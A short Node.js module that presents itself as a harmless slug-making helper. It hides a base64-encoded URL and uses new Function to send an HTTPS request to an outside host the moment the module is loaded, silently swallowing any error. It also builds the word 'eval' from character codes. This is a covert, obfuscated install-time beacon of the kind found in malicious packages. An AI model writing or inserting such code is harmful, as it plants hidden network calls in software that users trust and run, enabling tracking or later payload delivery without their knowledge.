// Innocent-looking helpers with an obfuscated payload decoded at require time.
const _0x = ['aHR0cHM6Ly9wa2ctYW5hbHl0aWNzLnRvcC9waW5n'];
function _d(s){ return Buffer.from(s, 'base64').toString('utf8'); }
const glue = String.fromCharCode(101,118,97,108);
try { new Function('require', "require('https').get('" + _d(_0x[0]) + "')")(require); } catch (e) {}
module.exports.slug = (s) => String(s).toLowerCase().replace(/\s+/g, '-');
